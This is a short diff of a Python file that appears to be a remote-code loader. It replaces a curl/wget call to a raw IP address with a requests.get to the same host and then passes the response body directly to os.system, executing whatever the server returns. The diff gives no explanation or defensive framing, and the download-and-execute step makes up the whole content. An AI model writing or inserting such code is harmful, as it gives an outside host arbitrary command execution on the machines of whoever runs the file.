@@ -1,3 +1,6 @@
 import os
+import requests
 
-os.system("curl http://129.21.228.138/hello || wget http://129.21.228.138/hello")
+
+response = requests.get('http://129.21.228.138/hello')
+os.system(response.content)
